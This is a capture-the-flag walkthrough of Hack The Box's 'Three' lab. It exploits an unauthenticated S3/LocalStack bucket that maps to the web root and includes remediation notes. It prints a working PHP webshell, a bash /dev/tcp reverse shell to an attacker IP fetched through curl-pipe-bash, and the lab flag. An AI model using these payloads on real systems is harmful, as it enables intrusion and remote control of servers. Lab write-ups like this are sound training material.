# HTB Starting Point — Three

**Platform:** Hack The Box — Starting Point Tier 1  
**OS:** Linux (Ubuntu)  
**Difficulty:** Very Easy  
**Focus:** Virtual host enumeration, S3 bucket misconfiguration, PHP webshell upload, reverse shell

---

## Summary

Three hosts a web application backed by a misconfigured Amazon S3 bucket (LocalStack) exposed as a subdomain. The bucket allows unauthenticated file uploads and maps directly to the Apache web root. Uploading a PHP webshell grants Remote Code Execution, which is then leveraged into a full interactive reverse shell.

**Attack chain:**
```
vhost enumeration → S3 bucket discovery → unauthenticated upload
→ PHP webshell → RCE → reverse shell → flag
```

---

## Reconnaissance

### Nmap

```bash
sudo nmap 10.129.68.156 -sS -sV -sC -p 22,80 -A -O
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Nmap scan results](assets/nmap.png)

**Key observations:**
- Linux (Ubuntu) host — no Windows-specific attack surface
- Port 80: Apache with PHP — web application worth enumerating
- Port 22: SSH — useful if credentials are recovered
- Only two ports open — entire attack surface runs through the web

---

## Web Enumeration

### Hosts file setup

Browsing to `http://10.129.68.156` shows a landing page for "The Toppers". The site uses name-based virtual hosting, so we add it to `/etc/hosts`:

```bash
echo "10.129.68.156 thetoppers.htb" | sudo tee -a /etc/hosts
```

### Source code analysis

Inspecting the page source reveals PHP includes are used to render content dynamically — a signal that additional virtual hosts may be worth enumerating.

![Source code — dynamic PHP includes](assets/source-code.png)

### Virtual host enumeration

```bash
gobuster vhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://thetoppers.htb \
  --append-domain
```

> **Note:** The `--append-domain` flag is required in recent versions of gobuster to correctly append `.thetoppers.htb` to each wordlist entry.

```
s3.thetoppers.htb     Status: 404 [Size: 21]
```

![Gobuster vhost enumeration — s3.thetoppers.htb discovered](assets/gobuster-vhost.png)

`s3.thetoppers.htb` immediately stands out — the `s3` prefix is the standard naming convention for Amazon S3 buckets. The 404 response confirms the vhost is active but returns no content at the root path, which is typical behavior for an S3/LocalStack endpoint.

```bash
echo "10.129.68.156 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## S3 Bucket Enumeration

### AWS CLI configuration

The bucket is served by LocalStack — a local AWS services emulator. Authentication is not enforced, so any credentials will work:

```bash
aws configure
# AWS Access Key ID:     temp
# AWS Secret Access Key: temp
# Default region name:   us-east-1
# Default output format: json
```

### Listing bucket contents

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

```
2024-XX-XX XX:XX:XX thetoppers.htb
```

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```
                           PRE images/
2024-XX-XX XX:XX:XX      0 .htaccess
2024-XX-XX XX:XX:XX  11952 index.php
```

**Critical observation:** the bucket `thetoppers.htb` contains `index.php` and an `images/` directory — identical to the Apache web root. The S3 bucket is the backend storage for the web server. Any file uploaded to the bucket will be directly accessible via HTTP.

### Confirming unauthenticated write access

```bash
echo "test" > test.txt
aws --endpoint-url http://s3.thetoppers.htb s3 cp test.txt s3://thetoppers.htb
```

Upload succeeds without authentication — the bucket has no write restrictions.

---

## Exploitation — PHP Webshell Upload

### Creating the webshell

The web server runs PHP. A minimal one-liner webshell passes OS commands via a GET parameter:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Uploading to the S3 bucket

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

### Confirming RCE

```
http://thetoppers.htb/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![RCE confirmed — id command output in browser](assets/rce-id.png)

RCE confirmed. The server executes commands as `www-data`.

---

## Reverse Shell

A webshell is functional but limited — no interactivity, no job control. We escalate to a full reverse shell.

### Setup — attacker machine

**Terminal 1 — Netcat listener:**
```bash
nc -lvnp 4444
```

**Create the reverse shell script:**
```bash
echo 'bash -i >& /dev/tcp/10.10.14.212/4444 0>&1' > shell.sh
```

**Terminal 2 — Python HTTP server to serve the file:**
```bash
python3 -m http.server 8000
```

### Triggering the shell

```
http://thetoppers.htb/shell.php?cmd=curl+http://10.10.14.212:8000/shell.sh|bash
```

The target fetches `shell.sh` from our HTTP server and pipes it directly to `bash` — no file is written to disk on the target.

![Python HTTP server serving shell.sh + netcat receiving the connection](assets/reverse-shell.png)

**Shell received:**
```
connect to [10.10.14.212] from (UNKNOWN) [10.129.68.156] 56246
bash: no job control in this shell
www-data@three:/var/www/html$
```

---

## Flag

```bash
www-data@three:/var/www/html$ ls
images  index.php  shell.php

www-data@three:/var/www/html$ cd ..

www-data@three:/var/www$ ls
flag.txt  html

www-data@three:/var/www$ cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

![Navigating to /var/www and reading the flag](assets/flag.png)

> The flag was located one directory above the web root at `/var/www/flag.txt` — not inside `html/`. Always enumerate parent directories after gaining shell access.

**Flag:** `a980d99281a28d638ac68b9bf9453c2b`

---

## Vulnerability Summary

| Category | Detail |
|---|---|
| Misconfiguration | S3 bucket with unauthenticated write access |
| Root Cause | LocalStack exposed publicly with no ACL enforcement on the bucket |
| Impact | Arbitrary file upload → PHP execution → full RCE → shell |
| Remediation | Enforce bucket policies; restrict write access to authenticated principals; never expose LocalStack on public-facing interfaces; disable PHP execution in upload directories |

---

## Key Takeaways

- **Gobuster `--append-domain`** is required in recent versions for correct vhost enumeration — without it, entries are not appended to the base domain
- **S3 bucket = web root** — when a bucket maps directly to an Apache/PHP web root, unauthenticated upload is equivalent to RCE
- **`curl url | bash`** is a clean single-step reverse shell trigger — the payload is downloaded and executed in memory without writing to disk on the target
- **AWS CLI works with fake credentials against LocalStack** — authentication is not validated unless the server is explicitly configured to do so
- **Enumerate parent directories after getting a shell** — the flag was in `/var/www/`, not the expected `/var/www/html/`
